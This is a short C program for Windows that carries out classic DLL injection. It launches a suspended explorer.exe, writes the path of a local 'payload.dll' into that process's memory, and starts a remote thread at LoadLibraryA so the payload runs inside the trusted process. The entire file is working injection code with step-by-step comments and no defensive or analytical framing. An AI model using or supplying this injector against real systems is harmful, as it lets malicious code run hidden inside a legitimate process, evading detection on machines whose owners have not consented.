#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int main(int argc, char *argv[]) {

    //dll path
    char dllpath[260];
    GetCurrentDirectoryA(260, dllpath);
    strcat(dllpath, "\\payload.dll");

    //Win32API stuff
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    //new suspended explorer instance
    CreateProcessA("C:\\Windows\\explorer.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    //allocate some memory in explorer instance
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, strlen(dllpath)+1, MEM_COMMIT, PAGE_READWRITE);

    //write the dll's path into the allocated memory
    WriteProcessMemory(pi.hProcess, remoteMem, dllpath, strlen(dllpath)+1, NULL);

    //get reference to Windows loader
    LPVOID loadLibraryAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");

    //use it to load the dll from the path inside explorers memory
    CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteMem, 0, NULL);

    //start the thread
    ResumeThread(pi.hThread);

    return 0;
}
